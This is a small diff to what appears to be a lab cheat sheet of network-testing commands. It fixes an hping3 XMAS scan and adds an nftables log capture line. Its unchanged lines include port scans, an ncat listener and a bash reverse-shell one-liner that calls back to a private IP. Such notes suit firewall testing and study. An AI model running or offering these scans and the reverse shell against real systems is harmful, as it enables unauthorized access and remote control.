@@ -14,7 +14,7 @@ TCP RST only
 sudo hping3 -c 1 -R -p 443 192.168.0.16
 
 TCP XMAS
-sudo hping -c 1 -X -p 443 192.168.0.16
+sudo hping3 -c 1 -FPU -p 443 192.168.0.16
 
 TCP FIN scan
 sudo hping3 -F --scan 8000-9000 192.168.0.16
@@ -27,3 +27,6 @@ ncat -l 8080
 
 reverse shell victim:
 /bin/bash -i >& /dev/tcp/192.168.0.15/8080 0>&1
+
+live logs:
+sudo journalctl -k | grep "nftables" >> nftlogs
